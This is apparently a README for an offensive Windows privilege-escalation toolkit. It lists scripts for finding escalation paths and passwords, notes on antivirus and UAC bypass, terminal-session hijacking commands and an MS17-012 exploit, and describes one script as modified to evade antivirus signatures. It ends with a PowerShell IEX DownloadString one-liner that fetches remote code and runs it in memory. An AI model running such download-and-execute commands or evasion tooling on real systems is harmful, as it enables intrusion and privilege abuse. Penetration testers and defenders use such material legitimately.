# WinEscalation-

Scan.ps1:
Powershell script used to determine what methods can be used to escalate privileges and find passwords (admin and non-admin privs).


AVbypass.txt:
List of URLs discussing different methods of bypassing AV.

TScommands.txt:
Commands on how to hijack a TS session on a box (must have admin rights).

UACbypass.txt:
URLs discussing different methods of bypassing UAC.


MS17-012/CVE-2017-0100:
Start-ProcessInSession.ps1 & MS17-012.cs - non-priveleged session hijack



Author: Scott Sutherland 2013, NetSPI
Version: Get-SPN version 1.1
Requirements: Powershell v.3
Comments: The technique used to query LDAP was based on the "Get-AuditDSDisabledUserAcount" 
function found in Carols Perez's PoshSec-Mod project.#
Modded to bypass AV sig detection.

Get-SPM.psm1: 

IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/Get-SPM.psm1")

